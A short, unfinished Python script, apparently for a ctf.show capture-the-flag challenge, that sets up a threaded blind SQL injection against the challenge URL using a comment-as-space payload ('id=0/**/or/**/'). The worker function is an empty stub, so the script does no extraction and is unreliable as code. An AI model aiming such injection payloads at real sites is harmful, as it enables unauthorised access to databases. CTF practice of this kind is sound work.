import requests
import queue
import threading
import warnings
warnings.filterwarnings("ignore")
word=""
end=int(input())
def fun(url,result1,result2):
    reponse=requests.get(url)
url = "https://ebf0be59-85f5-4005-acd9-0d931dfb4e8c.challenge.ctf.show/index.php?id=0/**/or/**/"
result1=queue.Queue()
result2=queue.Queue()
for i in range(1,end):
    result1.put(i)
    result2.put(i)
for  i in range(1,26):
    t=threading.Thread(target=fun,args=(url,result1,result2))
    t.start()